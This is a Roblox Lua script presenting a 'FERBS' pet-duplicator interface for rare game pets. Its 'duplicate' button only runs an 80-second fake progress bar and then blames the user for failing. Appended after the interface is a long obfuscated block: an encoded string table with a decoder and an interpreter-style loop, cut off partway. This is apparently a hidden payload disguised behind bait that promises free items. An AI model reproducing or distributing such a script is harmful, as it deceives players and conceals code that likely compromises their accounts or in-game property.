local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "FerbsDuplicatorMobile"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Mobile detection
local isMobile = game:GetService("UserInputService").TouchEnabled
local textSizeMultiplier = isMobile and 1.3 or 1

--= BLACK THEME =--
local function applyDarkTheme(frame)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    frame.BackgroundTransparency = 0.1
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 15))
    })
    gradient.Rotation = 90
    gradient.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    return frame
end

--= MAIN FRAME (Responsive Sizing) =--
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = isMobile and UDim2.new(0.9, 0, 0, 350) or UDim2.new(0, 450, 0, 300)
mainFrame.Position = isMobile and UDim2.new(0.5, 0, 0.5, 0) or UDim2.new(0.5, -225, 0.5, -150)
mainFrame.AnchorPoint = isMobile and Vector2.new(0.5, 0.5) or Vector2.new(0, 0)
mainFrame = applyDarkTheme(mainFrame)
mainFrame.Parent = gui

--= FERBS WATERMARK (Mobile Optimized) =--
local ferbsWatermark = Instance.new("TextLabel")
ferbsWatermark.Name = "FerbsWatermark"
ferbsWatermark.Size = UDim2.new(0, 200 * (isMobile and 1.2 or 1), 0, 50 * (isMobile and 1.2 or 1))
ferbsWatermark.Position = UDim2.new(0.5, -100 * (isMobile and 1.2 or 1), 0.9, 0)
ferbsWatermark.Text = "FERBS"
ferbsWatermark.TextColor3 = Color3.fromRGB(0, 255, 255)
ferbsWatermark.BackgroundTransparency = 1
ferbsWatermark.Font = Enum.Font.GothamBlack
ferbsWatermark.TextSize = 28 * textSizeMultiplier
ferbsWatermark.TextStrokeTransparency = 0.5
ferbsWatermark.TextStrokeColor3 = Color3.fromRGB(0, 150, 150)
ferbsWatermark.ZIndex = 100
ferbsWatermark.Parent = gui

-- Wave animation
spawn(function()
    while true do
        for i = 0, 1, 0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
        for i = 1, 0, -0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
    end
end)

--= FLOATING FERBS TEXTS (Mobile Adjusted) =--
for i = 1, (isMobile and 5 or 8) do
    local floatingFerbs = Instance.new("TextLabel")
    floatingFerbs.Name = "FloatingFerbs_"..i
    floatingFerbs.Size = UDim2.new(0, (80 + math.random(-20,20)) * (isMobile and 1.2 or 1), 0, 30 * (isMobile and 1.2 or 1))
    floatingFerbs.Position = UDim2.new(math.random(), -40 * (isMobile and 1.2 or 1), math.random(0.1,0.8), -15 * (isMobile and 1.2 or 1))
    floatingFerbs.Text = "FERBS"
    floatingFerbs.TextColor3 = Color3.fromRGB(
        100 + math.random(0,155),
        100 + math.random(0,155),
        255
    )
    floatingFerbs.BackgroundTransparency = 1
    floatingFerbs.Font = Enum.Font.GothamBold
    floatingFerbs.TextSize = (14 + math.random(-2,4)) * textSizeMultiplier
    floatingFerbs.TextTransparency = 0.7
    floatingFerbs.ZIndex = 50
    floatingFerbs.Parent = gui
    
    spawn(function()
        local speed = 0.5 + math.random()
        local offset = math.random(1,10)
        while true do
            floatingFerbs.Position = UDim2.new(
                floatingFerbs.Position.X.Scale,
                floatingFerbs.Position.X.Offset,
                0.1 + (math.sin(tick()*speed + offset) * 0.1),
                floatingFerbs.Position.Y.Offset
            )
            floatingFerbs.TextTransparency = 0.5 + (math.sin(tick()*2 + i) * 0.3)
            task.wait()
        end
    end)
end

--= DUPLICATE BUTTON (Mobile Friendly) =--
local duplicateButton = Instance.new("TextButton")
duplicateButton.Name = "DuplicateButton"
duplicateButton.Size = UDim2.new(0.8, 0, 0, isMobile and 70 or 60)
duplicateButton.Position = UDim2.new(0.1, 0, 0.3, 0)
duplicateButton.Text = "DUPLICATE PET"
duplicateButton.TextColor3 = Color3.new(1, 1, 1)
duplicateButton.Font = Enum.Font.GothamBlack
duplicateButton.TextSize = 20 * textSizeMultiplier
duplicateButton.AutoButtonColor = false
duplicateButton.Parent = mainFrame

-- Button styling
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = duplicateButton

local buttonStroke = Instance.new("UIStroke")
buttonStroke.Thickness = 3
buttonStroke.Color = Color3.fromRGB(0, 200, 200)
buttonStroke.Parent = duplicateButton

-- Button gradient
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 200))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = duplicateButton

-- Touch support for mobile
if isMobile then
    local touchButtonEffect = Instance.new("Frame")
    touchButtonEffect.Name = "TouchEffect"
    touchButtonEffect.Size = UDim2.new(1, 0, 1, 0)
    touchButtonEffect.BackgroundColor3 = Color3.new(1, 1, 1)
    touchButtonEffect.BackgroundTransparency = 0.9
    touchButtonEffect.ZIndex = 10
    touchButtonEffect.Visible = false
    touchButtonEffect.Parent = duplicateButton
    
    duplicateButton.TouchTap:Connect(function()
        touchButtonEffect.Visible = true
        game:GetService("TweenService"):Create(
            touchButtonEffect,
            TweenInfo.new(0.3),
            {BackgroundTransparency = 1}
        ):Play()
        task.wait(0.3)
        touchButtonEffect.Visible = false
    end)
end

-- Button hover effects (desktop only)
if not isMobile then
    duplicateButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 255, 255)}
        ):Play()
    end)

    duplicateButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 200, 200)}
        ):Play()
    end)
end

--= FULLSCREEN LOADING SCREEN (Mobile Optimized) =--
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
loadingFrame.BackgroundTransparency = 0.05
loadingFrame.Visible = false
loadingFrame.ZIndex = 100
loadingFrame.Parent = gui

-- Loading text (mobile responsive)
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = isMobile and UDim2.new(0.9, 0, 0, 250) or UDim2.new(0.8, 0, 0, 150)
loadingText.Position = isMobile and UDim2.new(0.05, 0, 0.2, 0) or UDim2.new(0.1, 0, 0.3, 0)
loadingText.Text = "🔍 Searching for low-pop server...\n\n• Works on: Dragonfly, Queen Bee, Disco Bee, Red Fox, Raccoon, Butterfly\n• Doesn't work on fruits or low-tier pets\n\nPlease wait while we find the best server..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16 * textSizeMultiplier
loadingText.TextXAlignment = Enum.TextXAlignment.Left
loadingText.TextYAlignment = Enum.TextYAlignment.Top
loadingText.TextWrapped = true
loadingText.Parent = loadingFrame

-- Loading bar (thicker on mobile)
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = isMobile and UDim2.new(0.9, 0, 0, 20) or UDim2.new(0.8, 0, 0, 15)
loadingBar.Position = isMobile and UDim2.new(0.05, 0, 0.6, 0) or UDim2.new(0.1, 0, 0.6, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
loadingBar.Parent = loadingFrame

local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
loadingBarFill.Parent = loadingBar

-- Loading percentage (bigger on mobile)
local percentText = Instance.new("TextLabel")
percentText.Name = "PercentText"
percentText.Size = UDim2.new(0, 100 * (isMobile and 1.3 or 1), 0, 40 * (isMobile and 1.3 or 1))
percentText.Position = UDim2.new(0.5, -50 * (isMobile and 1.3 or 1), 0.5, -20 * (isMobile and 1.3 or 1))
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.Font = Enum.Font.GothamBlack
percentText.TextSize = 30 * textSizeMultiplier
percentText.BackgroundTransparency = 1
percentText.Parent = loadingFrame

--= DUPLICATE FUNCTION (Mobile Compatible) =--
local function startDuplication()
    loadingFrame.Visible = true
    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
    
    local duration = 80
    local startTime = tick()
    
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local progress = math.min((tick() - startTime) / duration, 1)
        
        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = math.floor(progress * 100) .. "%"
        
        if progress >= 1 then
            connection:Disconnect()
            
            -- Success message (mobile responsive)
            local successText = Instance.new("TextLabel")
            successText.Text = "❌ Please make sure you followed all the requirements, or there might be a connection issue"
            successText.Size = isMobile and UDim2.new(0.9, 0, 0, 80) or UDim2.new(0.8, 0, 0, 50)
            successText.Position = isMobile and UDim2.new(0.05, 0, 0.7, 0) or UDim2.new(0.1, 0, 0.7, 0)
            successText.TextColor3 = Color3.fromRGB(0, 255, 0)
            successText.Font = Enum.Font.GothamBlack
            successText.TextSize = 22 * textSizeMultiplier
            successText.BackgroundTransparency = 0.8
            successText.TextWrapped = true
            successText.Parent = loadingFrame
            
            task.wait(10)
            loadingFrame.Visible = false
            successText:Destroy()
        end
    end)
end

-- Connect both mouse and touch inputs
duplicateButton.MouseButton1Click:Connect(startDuplication)
if isMobile then
    duplicateButton.TouchTap:Connect(startDuplication)
end

return(function(...)local D={"\097\084\106\061","\121\111\049\070\053\051\117\050";"\085\085\099\114";"\115\051\117\057\073\051\052\113","\110\120\117\084\049\078\054\071\071\068\086\075\052\078\054\106\073\050\114\061","\085\088\122\077\121\088\085\070\106\120\049\065\115\088\085\103\115\088\085\078\106\071\061\061";"\112\089\049\090\121\120\115\065\115\079\061\061","\110\084\115\047\071\111\099\098\110\084\107\073\110\051\083\090\097\079\061\061","\053\076\054\098\052\084\115\110\115\102\052\083\051\050\076\048","\073\048\083\118\074\103\065\073\076\065\085\057\052\068\081\073","\071\090\086\109\085\108\085\047\112\051\083\088\085\120\102\065\076\051\119\061";"\076\102\071\119\053\065\099\043\076\050\122\073\073\103\083\083\083\071\061\061";"\110\069\101\110\079\111\104\116\098\049\051\104\107\109\101\102\052\071\097\054\119\102\074\117\118\084\122\072\109\106\104\047\043\065\101\117\118\105\086\117\075\074\114\061","\097\084\120\061","\110\122\049\056\071\108\083\075\110\084\085\090";"\097\048\071\061";"\052\065\121\111\083\103\098\047\067\122\081\099\053\076\117\083\073\104\061\061","\085\047\052\065\121\068\117\107\097\051\076\061","\083\047\099\070\097\111\106\061";"\071\122\068\102\118\051\081\118\088\074\099\065\076\079\061\061";"\073\048\054\055\073\048\122\090";"\121\048\085\090\097\051\085\090\073\047\049\107\073\068\086\065","\073\050\065\090\083\071\061\061","\047\102\054\100\083\051\119\061","","\115\088\122\109\097\088\076\061","\052\102\107\088\052\103\085\112\112\084\052\117\112\111\081\111\067\079\061\061","\097\088\085\055","\083\068\086\118\097\111\106\061","\073\048\107\107\121\104\061\061";"\049\102\114\090\114\090\071\111\083\090\071\048\115\050\073\061";"\047\102\054\050\073\057\061\061","\121\088\052\107\097\088\057\061";"\115\088\054\108\115\089\099\081\097\068\121\061";"\121\068\122\055\083\088\054\077","\074\065\081\048\067\088\115\089\051\065\083\119\049\111\078\117\071\090\076\061","\112\122\098\089\051\084\099\076\114\068\085\065";"\097\050\098\070\097\111\098\106\114\120\054\043\115\078\122\056\121\071\061\061","\051\120\086\107\053\065\052\048\067\068\102\071\097\120\085\114\085\065\121\061";"\097\088\054\107\083\089\052\090\121\068\065\055\083\057\061\061";"\097\051\122\090\053\079\061\061","\121\068\085\077\097\111\083\065";"\115\088\054\055\115\051\102\109\083\047\106\061","\075\082\110\120\090\098\068\088\057\052\105\090\075\098\099\087\087\069\102\120\087\047\106\077\121\051\086\099\047\071\053\077\082\122\112\098\098\082\085\089\048\047\099\069\119\101\113\052\108\052\100\077\088\108\049\112\120\080\087\114\070\103\122\055\067\102\113\050\051\118\074\118\110\099\115\110\068\072\111\081\067\119\116\120\077\082\087\053\121\079\086\081\115\113\086\052\071\054\070\108\089\056\119\072\099\117\099\089\053\048\101\113\070\052\080\070\100\082\078\105\071\049\082\074\098\055\121\121\116\067\090\104\043\121\106\087\101\084\054\083\085\072\055\108\120\112\107\090\052\106\053\073\066\048\074\073\100\081\104\074\057\097\079\066\103\101\054\089\053\083\076\099\048\104\057\047\099\049\089\110\088\069\072\048\102\048\099\076\072\086\100\055\051\080\073\074\099\066\067\082\117\108\048\109\080\090\110\116\043\050\049\068\074\117\076\072\054\107\067\081\069\053\115\047\116\103\102\088\051\067\107\097\057\052\056\068\072\048\119\043\116\089\055\052\068\083\117\099\043\109\048\114\097\066\079\050\121\122\070\105\121\052\102\082\075\071\049\074\099\069\052\056\104\076\110\049\089\104\061\061";"\085\048\085\109\053\088\054\118\053\057\061\061";"\083\111\052\102\073\104\061\061";"\083\048\102\107\115\088\052\056";"\110\109\104\065\083\069\056\081\110\104\061\061","\047\102\054\077\083\047\049\107\115\088\122\109\097\088\076\061","\083\048\122\077\083\071\061\061";"\110\104\061\061";"\119\054\122\090\107\051\055\119\086\103\065\121\066\049\048\067\049\085\082\102\104\116\102\097\114\107\053\086\056\121\074\056\073\048\069\057\088\100\083\079\102\122\074\088\118\102\113\090\107\069\098\106\087\122\097\054\043\115\079\077\067\108\109\084\121\086\056\103\051\107\102\047\111\075\066\105\071\108\086\082\071\111\119\047\105\056\084\074\057\077\119\053\111\109\116\075\106\068\054\057\097\048\090\112\078\055\047\081\101\100\108\085\111\087\051\105\104\113\117\054\101\043\116\054\111\076\066\122\115\115\105\079\101\114\088\055\109\101\110\117\089\087\103\066\076\121\049\065\069\120\117\105\100\090\049\081\110\076\113\069\105\068\106\075\078\053\077\077\086\076\102\066\109\114\079\085\080\106\112\086\065\117\077\079\117\075\101\051\073\081\065\112\120\118\106\086\056\110\087\090\072\120\071\052\100\113\078\099\055\077\075\104\087\104\074\066\072\076\067\121\111\100\105\082\106\076\067\080\085\066\112\106\122\107\116\075\072\109\051\057\122\120\107\111\047\083\109\071\071\083\067\071\082\054\107\117\051\121\098\055\086\051\050\108\067\122\088\074\119\102\054\102\102\050\106\113\090\104\061\061","\047\102\054\081\097\068\049\065\067\079\061\061"}for y,C in ipairs({{-673077+673078,-712769-(-712822)},{648308+-648307,-227028-(-227047)};{-1006335+1006355,751148-751095}})do while C[203558+-203557]<C[642678-642676]do D[C[271912+-271911]],D[C[882427+-882425]],C[-627635+627636],C[796987-796985]=D[C[728375+-728373]],D[C[-349610-(-349611)]],C[-581042+581043]+(91683+-91682),C[-703798+703800]-(68387-68386)end end local function y(y)return D[y+(-194342+203896)]end do local y=math.floor local C=string.len local O=table.insert local o=string.char local N=table.concat local G=D local T={["\052"]=184806+-184793;X=-783026-(-783032),["\056"]=239375-239335;["\057"]=891388+-891340,k=-818233+818266,Q=-39649+39690;["\047"]=446638+-446615,["\055"]=-165367-(-165413),v=-346475+346522,O=469807+-469807,K=-860091+860101;["\053"]=477001-476975,N=208934+-208898,G=-619299-(-619315),g=951549+-951514;n=308216-308202;M=572402+-572357,["\049"]=-120420+120437;j=107691-107683;b=456110+-456109;W=832453-832442,e=657391-657332;P=118339-118308,l=-294710-(-294761),J=-354456-(-354475);L=-501552+501572;u=-443886+443943,w=-387692+387748,z=-673717+673722;Z=-651264-(-651316),C=613329-613299,["\054"]=597683+-597622,V=-462958+463007;d=-637576-(-637620);U=-393004+393025;m=-697364-(-697398);D=92553-92515;E=617717-617715,a=-654004+654031,s=647540+-647511,o=883762-883707;c=612732-612723;p=430527-430509,B=353003+-352945;x=561845-561841,I=-60642+60666,i=912636+-912576,["\043"]=-404995-(-405037);H=861514-861499,Y=-558186-(-558193);["\048"]=-860667+860721;T=-833079-(-833082);["\051"]=-671391-(-671413),f=771064+-771011,R=-156454-(-156517),y=-832122+832150;F=402590-402540,q=-872379+872422;["\050"]=-569010+569049,t=-174887-(-174949);S=353156-353131;r=-21025+21037;h=862139+-862107;A=108387+-108350}local d=string.sub local h=type for D=-908156+908157,#G,309227-309226 do local k=G[D]if h(k)=="\115\116\114\105\110\103"then local h=C(k)local w={}local B=519856+-519855 local Q=232615-232615 local u=649268+-649268 while B<=h do local D=d(k,B,B)local C=T[D]if C then Q=Q+C*(-258984+259048)^((-439790+439793)-u)u=u+(509617-509616)if u==811325-811321 then u=962750+-962750 local D=y(Q/(1012543+-947007))local C=y((Q%(614385-548849))/(-794617-(-794873)))local N=Q%(-210791-(-211047))O(w,o(D,C,N))Q=-1013375-(-1013375)end elseif D=="\061"then O(w,o(y(Q/(-341995+407531))))if B>=h or d(k,B+(771705-771704),B+(-215719+215720))~="\061"then O(w,o(y((Q%(1012925-947389))/(344491+-344235))))end break end B=B+(-124515-(-124516))end G[D]=N(w)end end end return(function(D,O,o,N,G,T,d,j,I,h,Q,B,C,w,V,e,u,k,P,J)B,Q,k,w,P,J,V,j,u,C,h,I,e=-649972+649972,function(D)for y=-764919-(-764920),#D,-1008255+1008256 do k[D[y]]=(70179-70178)+k[D[y]]end if o then local C=o(true)local O=G(C)O[y(884155+-893690)],O[y(-107330-(-97827))],O[y(-833082+823571)]=D,u,function()return-144996+-722999 end return C else return N({},{[y(399148+-408651)]=u;[y(-132067-(-122532))]=D,[y(175525+-185036)]=function()return-462126+-405869 end})end end,{},function()B=B+(917245-917244)k[B]=-441773-(-441774)return B end,function(D,y)local O=Q(y)local o=function(o,N,G)return C(D,{o;N;G},y,O)end return o end,function(D,y)local O=Q(y)local o=function(o,N,G,T)return C(D,{o,N;G;T},y,O)end return o end,function(D,y)local O=Q(y)local o=function(o,N)return C(D,{o,N},y,O)end return o end,function(D)k[D]=k[D]-(513521-513520)if k[D]==-613811+613811 then k[D],h[D]=nil,nil end end,function(D)local y,C=-361131+361132,D[561458-561457]while C do k[C],y=k[C]-(291753+-291752),y+(141284+-141283)if 592626-592626==k[C]then k[C],h[C]=nil,nil end C=D[y]end end,function(C,o,N,G)local W,p,u,b,c,s,a,Z,B,F,X,H,A,d,K,q,l,g,z,Q,Y,E,n,L,k,v,f,t,r,m,R,e,U,M while C do if C<235303+7683892 then if C<337898+3312371 then if C<-854138+1859924 then if C<664629+184274 then if C<458388-(-226087)then if C<925949+-539518 then if C<-548337+652041 then B=h[N[716856-716854]]Q=h[N[-214500-(-214503)]]C=-63778+803128 k=B==Q d=k else C=-8608+14969705 Y=X E=Y l[Y]=E Y=nil end else B=h[N[177320-177317]]Q=157478-157477 k=B~=Q C=k and-312746+8827054 or 959166+4862964 end else if C<-451822+1196883 then C=d and-959102+3408584 or-827642+11915853 else k=y(862146-871675)d=y(663689-673205)C=D[d]d=C(k)C=D[y(-591218+581688)]d={}end end else if C<-181478+1080743 then if C<1459769-580722 then B=y(-150437+140886)Q=-864827+10110294 d=-597555+14810597 k=B^Q C=d-k d=y(-912156-(-902652))k=C C=d/k d={C}C=D[y(-731882-(-722358))]else C=314410+3630158 end else if C<1094298-144036 then z=692919-692917 R=Z[z]z=h[g]C=475631+11766663 s=R==z U=s else v=w()K=-913532+913535 h[v]=d C=h[M]F=-678709+678774 d=C(K,F)K=w()C=-737783+737783 h[K]=d F=C Y=J(959230+-95972,{})C=76002-76002 H=C l=y(999585-1009087)d=D[l]l={d(Y)}C={O(l)}l=C d=-738805-(-738807)C=l[d]Y=C b=y(-244072+234571)d=y(-74987-(-65442))C=D[d]X=h[Q]q=D[b]b=q(Y)q=y(499372-508912)a=X(b,q)X={a()}d=C(O(X))X=w()h[X]=d a=h[K]d=-642611-(-642612)q=a a=-500463-(-500464)b=a a=870139-870139 W=b<a a=d-b C=12983149-1043968 end end end else if C<202790+1827895 then if C<189030+1657716 then if C<2354582-751415 then if C<892615-(-393580)then r=216935+-216934 h[B]=U z=h[c]R=z+r s=Z[R]A=F+s s=-379820-(-380076)C=A%s R=h[E]F=C s=H+R R=-301417-(-301673)A=s%R H=A C=-566834+14062030 else d={}C=D[y(933391-942909)]end else l=y(-232871+223362)C=7743564-(-892092)H=D[l]l=y(668986-678517)F=H[l]v=F end else if C<2519245-545201 then k=h[N[572659-572658]]d=#k k=-529072+529072 C=d==k C=C and 15551290-(-504496)or-892156+9486338 else p=K b=y(-708598+699065)q=D[b]b=y(192102+-201614)a=q[b]C=-474863+4212577 q=a(k,p)a=h[N[595128-595122]]b=a()X=q+b Y=X+t X=-82467+82723 l=Y%X b=-618674-(-618675)t=l X=Q[B]q=t+b a=u[q]Y=X..a Q[B]=Y p=nil end end else if C<991487+1498551 then if C<1820649-(-520176)then C=true C=C and 512688+5901332 or 1022336+11738630 else p=y(752986-762488)d=y(-182886+173341)C=D[d]u=y(697177-706678)k=h[N[222699-222695]]Q=D[u]v=I(7603016-33377,{})M=D[p]p={M(v)}t={O(p)}M=242730-242728 e=t[M]u=Q(e)Q=y(-709174+699634)B=k(u,Q)k={B()}d=C(O(k))B=h[N[90019+-90014]]C=B and 7500485-561649 or 7431554-(-1035648)k=d d=B end else if C<2377055-(-992767)then C=P(4048091-(-519088),{u})q={C()}C=D[y(782101-791609)]d={O(q)}else u=461103-461102 e=1036992+-1036990 B=h[N[972031-972030]]Q=B(u,e)B=59747-59746 k=Q==B d=k C=k and 1102465-363115 or-224+9440 end end end end else if C<-727351+6637686 then if C<-848442+5265237 then if C<3453205-(-566450)then if C<-282857+4184209 then if C<3240707-(-572082)then l=not H K=K+F p=K<=v p=l and p l=K>=v l=H and l p=l or p l=-891324+2874872 C=p and l p=56610+13357688 C=C or p else C={}k=C B=-266472+266473 Q=h[N[-134500+134509]]u=Q Q=-861114-(-861115)C=501424+16012616 e=Q Q=110051-110051 t=e<Q Q=B-e end else d={B}C=D[y(111213-120740)]end else if C<-275369+4497283 then p=-914428+914428 v=-347884-(-348139)C=h[N[-248296+248297]]B=Q M=C(p,v)C=15711551-(-802489)k[B]=M B=nil else C=440558+15857924 end end else if C<4876487-(-567538)then if C<5207680-43489 then C=8295581-361387 else W=350443+-350443 X=#l Y=X==W C=Y and-641972+9690312 or 8081815-178342 end else if C<6497269-750519 then K=y(86179+-95710)v=D[K]d=v C=595314-(-364715)else B=h[N[-527344+527347]]C=-116516+521520 Q=-555166-(-555313)k=B*Q B=-918844+919101 d=k%B h[N[-546225+546228]]=d end end end else if C<-803257+8177124 then if C<7648626-539953 then if C<7017284-39201 then if C<7486529-599859 then W=753335+-753329 C=h[M]b=915965-915964 q=C(b,W)C=y(-750773-(-741239))W=y(99427+-108961)D[C]=q b=D[W]W=-712118+712120 C=b>W C=C and 9510018-(-360619)or-331114+12523742 else Q=h[N[134250-134244]]B=Q==k d=B C=945213+7521989 end else C={}M=-862523+862778 h[N[-668019-(-668021)]]=C d=h[N[-513712+513715]]e=35184372446635-357803 u=d p=y(-825274+815741)K=899197-899196 C=4780018-1042304 d=B%e h[N[-246500-(-246504)]]=d t=B%M M=-711670+711672 e=t+M h[N[-50274+50279]]=e M=D[p]p=y(-401551-(-392044))t=M[p]M=t(k)t=y(-369361-(-359851))Q[B]=t p=-214246-(-214247)v=M t=-269672+269799 F=K K=-617715-(-617715)H=F<K K=p-F end else if C<717622+6581994 then C=true C=C and 846010+11212470 or 2865399-191142 else h[B]=a C=h[B]C=C and 4751984-338410 or 9274235-(-1005503)end end else if C<314090+7246668 then if C<444398+7091212 then k=y(753612-763128)C=D[k]B=h[N[-920565-(-920573)]]Q=216167-216167 k=C(B,Q)C=4138718-293993 else C=6571945-(-756023)q=F==H a=q end else if C<8127414-359595 then d=8848750-(-484271)Q=113380+1825112 B=y(-685493+675973)k=B^Q C=d-k d=y(-96722-(-87203))k=C C=d/k d={C}C=D[y(-93398-(-83875))]else W=#l X=-598579+598580 E=45538-45537 Y=u(X,W)C=419949+5000248 X=t(l,Y)W=h[H]m=X-E L=M(m)Y=nil W[X]=L X=nil end end end end end else if C<132324+12007580 then if C<-414893+10309343 then if C<961086+7671240 then if C<-186150+8688203 then if C<-854394+9239999 then if C<911932+7029558 then C=true C=C and 16989224-371244 or 534639-(-832954)else z=641845-641844 R=Z[z]A=C z=false s=R==z C=s and-58787-(-997823)or 13062575-820281 U=s end else C=-736823+11825034 k=nil h[N[-699894+699899]]=d end else if C<8794094-264168 then B=h[N[743354-743351]]Q=-715126+715158 k=B%Q F=-145816-(-145829)u=h[N[923137-923133]]v=708918+-708916 M=h[N[-479087+479089]]Y=h[N[-739636-(-739639)]]l=Y-k Y=-799737+799769 H=l/Y K=F-H p=v^K t=M/p e=u(t)u=-852986+4295820282 Q=e%u e=554289+-554287 v=-327786+328042 u=e^k B=Q/u p=73890+-73889 u=h[N[-351463-(-351467)]]M=B%p p=832570+4294134726 t=M*p e=u(t)k=nil u=h[N[-667121-(-667125)]]t=u(B)Q=e+t e=432107-366571 F=541361-541105 u=Q%e C=-236519+8830701 t=Q-u M=-274473+340009 e=t/M M=-423021-(-423277)t=u%M p=u-t u=nil M=p/v v=-687029+687285 p=e%v Q=nil K=e-p e=nil v=K/F B=nil K={t,M;p,v}M=nil h[N[-151396-(-151397)]]=K t=nil v=nil p=nil else Q=y(-839226+829717)B=D[Q]Q=y(-977800-(-968254))k=B[Q]Q=h[N[-631988+631989]]C=D[y(316906+-326431)]B={k(Q)}d={O(B)}end end else if C<9794534-655924 then if C<7851217-(-871291)then d=v C=K C=v and-747255+1707284 or 937789+4553066 else X=w()W=J(91363+1778518,{X;v;K;e})Z=y(-825404-(-815865))d={}s=nil f=y(65635-75170)Y={}h[X]=Y m=y(86627+-96140)Y=w()L=w()h[Y]=W u=nil W={}t=nil F=nil E={}h[L]=W W=D[m]e=j(e)t=y(-734113-(-724598))g=h[L]C=D[y(-837831-(-828282))]c={[f]=g;[Z]=s}m=W(E,c)W=J(12356954-769528,{L;X,H;v;K,Y})H=j(H)Y=j(Y)Q=m X=j(X)p=nil l=nil L=j(L)K=j(K)B=W v=j(v)M=nil M=-549361+32385042274241 e=B(t,M)u=Q[e]e=y(-582770+573253)M=y(-517616+508094)p=148965+5184183586039 D[e]=u t=B(M,p)p=y(-560945-(-551409))v=764728+22207805367698 e=Q[t]t=y(71772-81315)D[t]=e l=y(567474+-577018)M=B(p,v)t=Q[M]Y=-151461+10167571772578 M=y(-450218-(-440686))p=y(-618175-(-608627))D[M]=t M=D[p]K=y(664883-674421)v=D[K]H=B(l,Y)B=nil F=Q[H]H=y(134508-144036)Q=nil H=v[H]K={H(v,F)}p=M(O(K))M=p()end else if C<-324650+9713561 then C=569266+13996043 t=h[e]d=t else b=y(-653300+643799)L=y(-508336+498815)C=D[b]W=D[L]b=C(W)C=y(725753-735287)D[C]=b C=337066+11438270 end end end else if C<379436+11236286 then if C<-839994+11776881 then if C<1041088+9272089 then if C<9690645-(-506096)then m=y(173029+-182576)L=w()h[L]=a d=D[m]n=1010767-1000767 E=181194-181094 g=-216103+216104 m=y(427437+-436990)C=d[m]c=697910+-697655 m=-192869-(-192870)d=C(m,E)m=w()E=-1018240+1018240 h[m]=d C=h[M]d=C(E,c)E=w()h[E]=d c=818490-818489 Z=763578-763576 C=h[M]f=h[m]d=C(c,f)c=w()h[c]=d d=h[M]f=d(g,Z)d=23586-23585 s=y(-804054-(-794553))Z=y(-1023744-(-1014207))C=f==d f=w()h[f]=C d=y(92515+-102055)r=368875+-368875 A=D[s]C=y(470127+-479669)R=h[M]z={R(r,n)}s=A(O(z))A=y(1034239-1043776)C=Y[C]U=s..A g=Z..U C=C(Y,d,g)g=w()h[g]=C U=I(3282627-(-275881),{M,L,K,Q,B,X,f,g;m,c,E,v})Z=y(725657-735159)d=D[Z]Z={d(U)}C={O(Z)}Z=C C=h[f]C=C and 17082858-783352 or 13070256-736823 else C=true C=499247+2175010 end else C=true d={}h[N[719478+-719477]]=C C=D[y(-35681+26129)]end else if C<10920664-(-342251)then C=h[N[801913+-801906]]C=C and-955518+8416098 or 2969338-(-875387)else B=o[-612211+612213]C=h[N[-565553-(-565554)]]k=o[-70113-(-70114)]Q=C C=Q[B]C=C and-714678+1597392 or 7221116-226983 end end else if C<11195156-(-766584)then if C<790392+11083426 then C=1768597-(-543153)else a=a+b L=not W d=a<=q d=L and d L=a>=q L=W and L d=L or d L=289257+9880909 C=d and L d=-304233+12435931 C=C or d end else if C<-401580+12521293 then C=-246440+2558190 else q=h[B]a=q C=q and 7821198-270504 or 6718765-(-609203)end end end end else if C<482031+13896440 then if C<12301354-(-616243)then if C<11832484-(-725174)then if C<12883533-620787 then if C<-728375+12927465 then W=y(-719286+709752)C=D[W]W=y(-418462-(-408941))D[W]=C C=-644148+12419484 else d=U C=A C=14533340-968510 end else A=h[B]U=A C=A and-783928+15738369 or-487663+1572624 end else if C<11863018-(-954366)then d={}C=D[y(506018-515568)]else M=y(-838778+829276)B=w()k=o C=true Q=y(470642-480175)h[B]=C 